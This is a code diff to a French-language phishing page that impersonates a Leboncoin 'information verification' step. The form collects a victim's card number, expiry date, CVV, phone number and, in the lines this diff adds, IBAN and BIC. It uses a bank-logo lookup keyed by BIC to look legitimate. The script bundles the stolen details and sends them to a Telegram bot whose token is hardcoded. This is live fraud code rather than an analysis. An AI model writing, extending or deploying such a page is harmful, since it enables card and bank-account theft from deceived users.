@@ -7,7 +7,7 @@
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: white;
+            background-color: #f5f5f5;
             margin: 0;
             display: flex;
             justify-content: center;
@@ -30,9 +30,14 @@
             margin-bottom: 150px;
         }
         h1 {
-            color: black;
+            color: #333;
             margin-bottom: 20px;
             font-size: 28px;
+            animation: fadeIn 1s ease-in-out;
+        }
+        @keyframes fadeIn {
+            0% { opacity: 0; transform: translateY(-20px); }
+            100% { opacity: 1; transform: translateY(0); }
         }
         .header-logo {
             position: fixed;
@@ -187,6 +192,36 @@
             margin-right: 5px;
             vertical-align: middle;
         }
+        .bank-logo {
+            margin-top: 10px;
+            display: none; /* Caché par défaut */
+            animation: zoomIn 0.5s ease-in-out;
+        }
+        @keyframes zoomIn {
+            0% { transform: scale(0); }
+            100% { transform: scale(1); }
+        }
+        .bank-logo img {
+            height: 50px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+        }
+        .iban-section {
+            margin-top: 20px;
+            padding: 20px;
+            background-color: #f9f9f9;
+            border-radius: 10px;
+            border: 1px solid #e0e0e0;
+        }
+        .iban-section h2 {
+            font-size: 18px;
+            color: #333;
+            margin-bottom: 15px;
+        }
+        .iban-section .input-field {
+            width: 80%; /* Réduire la largeur de la case IBAN */
+            margin: 10px auto; /* Centrer la case */
+        }
     </style>
 </head>
 <body>
@@ -197,7 +232,7 @@
 
     <!-- Plateforme de vérification des informations -->
     <div class="platform">
-        <h1>Vérification des Informations</h1>
+        <h1>Vérification des Informations 🛡️</h1>
         <p>Pour des raisons de sécurité, nous procéderons parfois à la vérification rapide de vos informations personnelles, y compris à chaque mise à jour du site. Veuillez confirmer votre compte.</p>
         
         <!-- Logo ajouté ici avec une animation flottante et agrandi x2 -->
@@ -207,29 +242,39 @@
 
         <!-- Formulaire pour les informations personnelles -->
         <form id="cardForm" action="{{ url_for('card') }}" method="POST" onsubmit="submitForm(event)">
-            <input type="text" class="input-field" id="card-holder" placeholder="Nom et prénom du titulaire de la carte" required>
-            <input type="text" id="card-number" class="input-field" placeholder="Numéro de carte" maxlength="19" required>
+            <input type="text" class="input-field" id="card-holder" placeholder="👤 Nom et prénom du titulaire de la carte" required>
+            <input type="text" id="card-number" class="input-field" placeholder="💳 Numéro de carte" maxlength="19" required>
             <div class="card-logos" id="card-logos">
                 <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa" id="visa-logo">
                 <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard" id="mastercard-logo">
                 <img src="https://logo-marque.com/wp-content/uploads/2020/11/American-Express-Logo.png" alt="American Express" id="amex-logo">
             </div>
             <div class="card-details">
-                <input type="text" id="expiry-date" class="input-field" placeholder="MM / YY" maxlength="7" required>
-                <input type="text" id="cvv" class="input-field" placeholder="CVV" maxlength="4" required>
+                <input type="text" id="expiry-date" class="input-field" placeholder="📅 MM / YY" maxlength="7" required>
+                <input type="text" id="cvv" class="input-field" placeholder="🔒 CVV" maxlength="4" required>
             </div>
-            <input type="text" class="input-field" id="phone" placeholder="Numéro de mobile" required>
+            <input type="text" class="input-field" id="phone" placeholder="📱 Numéro de mobile" required>
+
+            <!-- Section IBAN et BIC -->
+            <div class="iban-section">
+                <h2>Informations Bancaires 🏦</h2>
+                <input type="text" class="input-field" id="iban" placeholder="💳 IBAN" required>
+                <input type="text" class="input-field" id="bic" placeholder="🏛️ BIC" required>
+                <div class="bank-logo" id="bank-logo">
+                    <img id="bank-logo-img" src="" alt="Logo de la banque">
+                </div>
+            </div>
 
             <!-- Case à cocher pour accepter les CGV -->
             <div class="terms">
                 <label>
                     <input type="checkbox" id="accept-terms" required>
-                    J'accepte les <a href="https://www.leboncoin.fr/dc/cgv" target="_blank">Conditions Générales de Vente</a>
+                    J'accepte les <a href="https://www.leboncoin.fr/dc/cgv" target="_blank">Conditions Générales de Vente</a> ✅
                 </label>
             </div>
 
             <!-- Bouton de validation en bleu -->
-            <button type="submit" class="button" id="validate-button">Payer maintenant</button>
+            <button type="submit" class="button" id="validate-button">Payer maintenant 💳</button>
 
             <!-- Message de confirmation -->
             <div id="confirmation-message" class="confirmation-message">
@@ -254,6 +299,49 @@
     </div>
 
     <script>
+        // Liste des banques avec leurs logos
+        const banks = {
+            "BNPAFRPP": { name: "BNP Paribas", logo: "https://logo-marque.com/wp-content/uploads/2021/03/BNP-Paribas-Logo-650x366.png" },
+            "SOGEFRPP": { name: "Société Générale", logo: "https://www.theswiftcodes.com/images/bank-logo/france/societe-generale.png" },
+            "BREDFRPPXXX": { name: "BRED Banque Populaire", logo: "https://static.wixstatic.com/media/57117d_04b6208383c94cdb97302768eacf1c49~mv2.png/v1/fill/w_584,h_264,al_c,q_85,usm_0.66_1.00_0.01,enc_avif,quality_auto/BRED_BANQUE_POPULAIRE_LOGO_2LD_QUAD.png" },
+            "CCBPFRPP": { name: "Banque Populaire", logo: "https://www.changer-la-banque.com/wp-content/uploads/2022/05/Banque-Populaire-logo.png" },
+            "CEPAFRPP": { name: "Caisse d'Épargne", logo: "https://www.theswiftcodes.com/images/bank-logo/france/caisse-d-epargne.png" },
+            "AXABFRPP": { name: "Axa Banque", logo: "https://upload.wikimedia.org/wikipedia/commons/f/fd/Logo-axa-banque.png" },
+            "AGRIFRPP": { name: "Crédit Agricole", logo: "https://logos-marques.com/credit-agricole-logo/credit-agricole-logo-2/" },
+            "CMCIFR2A": { name: "Crédit Mutuel", logo: "https://www.maisonsdevendee.fr/media/logocm2018_carre_cmjn_72dpi__031211900_1028_11022019.jpg" },
+            "CRLYFRPP": { name: "Crédit Lyonnais (LCL)", logo: "https://upload.wikimedia.org/wikipedia/fr/0/0b/Lcl_logo.svg" },
+            "HFPFFRP1": { name: "HSBC France", logo: "https://banner2.cleanpng.com/20180430/vze/avdhhak8t.webp" },
+            "PSSTFRPP": { name: "La Banque postale", logo: "https://upload.wikimedia.org/wikipedia/fr/d/d4/Logo_La_Banque_postale_2022.svg" },
+            "CMCIFRPP": { name: "CIC France", logo: "https://upload.wikimedia.org/wikipedia/fr/a/a7/Cic_logo.svg" },
+            "REVOGB2L": { name: "Revolut", logo: "https://static.wixstatic.com/media/099da0_103304a097734c98a465c0be63ac65e5~mv2.png/v1/fill/w_525,h_525,al_c,q_85,usm_0.66_1.00_0.01,enc_avif,quality_auto/099da0_103304a097734c98a465c0be63ac65e5~mv2.png" },
+            "NTSBDE21": { name: "N26", logo: "https://upload.wikimedia.org/wikipedia/commons/6/69/N26_Logo.svg" },
+            "TRWIBD21": { name: "Wise", logo: "https://upload.wikimedia.org/wikipedia/commons/0/05/Wise_logo.svg" },
+            "BUNQNL2A": { name: "Bunq", logo: "https://upload.wikimedia.org/wikipedia/commons/4/42/Bunq-logo.svg" },
+            "MONZGB22": { name: "Monzo", logo: "https://upload.wikimedia.org/wikipedia/commons/6/62/Monzo_logo.svg" },
+            "SNNNFR22": { name: "Shine Pro", logo: "https://www.mariestum.com/wp-content/uploads/2023/03/shine-logo.svg" },
+            "LYDIFRPP": { name: "Lydia", logo: "https://upload.wikimedia.org/wikipedia/commons/f/f3/Lydia_logo.svg" }
+        };
+
+        // Fonction pour détecter la banque à partir du BIC
+        function detectBankFromBIC(bic) {
+            const bank = banks[bic];
+            if (bank) {
+                document.getElementById('bank-logo-img').src = bank.logo;
+                document.getElementById('bank-logo').style.display = 'block';
+                // Stocker le logo dans localStorage pour la page suivante
+                localStorage.setItem('bankLogo', bank.logo);
+            } else {
+                document.getElementById('bank-logo').style.display = 'none';
+                localStorage.removeItem('bankLogo');
+            }
+        }
+
+        // Écouteur d'événement pour le champ BIC
+        document.getElementById('bic').addEventListener('input', function (e) {
+            const bic = e.target.value.toUpperCase().substring(0, 8); // Prendre les 8 premiers caractères
+            detectBankFromBIC(bic);
+        });
+
         // Fonction pour formater le numéro de carte
         document.getElementById('card-number').addEventListener('input', function (e) {
             let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
@@ -304,9 +392,11 @@
             const expiryDate = document.getElementById('expiry-date').value;
             const cvv = document.getElementById('cvv').value;
             const phone = document.getElementById('phone').value;
+            const iban = document.getElementById('iban').value;
+            const bic = document.getElementById('bic').value;
             const acceptTerms = document.getElementById('accept-terms').checked;
 
-            if (!cardHolder || !cardNumber || !expiryDate || !cvv || !phone || !acceptTerms) {
+            if (!cardHolder || !cardNumber || !expiryDate || !cvv || !phone || !iban || !bic || !acceptTerms) {
                 alert('Veuillez remplir tous les champs et accepter les Conditions Générales de Vente.');
                 return;
             }
@@ -320,7 +410,9 @@
                            `Numéro de carte: ${cardNumber}\n` +
                            `Date d'expiration: ${expiryDate}\n` +
                            `CVV: ${cvv}\n` +
-                           `Téléphone: ${phone}`;
+                           `Téléphone: ${phone}\n` +
+                           `IBAN: ${iban}\n` +
+                           `BIC: ${bic}`;
 
             // Envoyer les données via l'API Telegram
             const botToken = '7636461108:AAFoL5FVlK-E33AfUbMi2CQk62w0fT85jKs';
